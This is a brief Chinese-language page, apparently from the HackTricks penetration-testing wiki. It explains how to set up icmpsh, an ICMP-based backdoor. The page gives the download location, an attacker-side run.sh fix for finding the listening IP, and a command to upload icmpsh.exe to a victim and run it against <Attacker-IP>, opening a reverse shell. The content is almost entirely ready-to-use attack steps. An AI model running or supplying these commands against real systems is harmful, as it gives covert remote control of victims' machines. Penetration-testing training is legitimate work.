{{#include ../banners/hacktricks-training.md}}

从以下地址下载后门: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# 客户端

执行脚本: **run.sh**

**如果出现错误，请尝试更改以下行:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**对于：**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **受害者端**

将 **icmpsh.exe** 上传到受害者并执行：
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
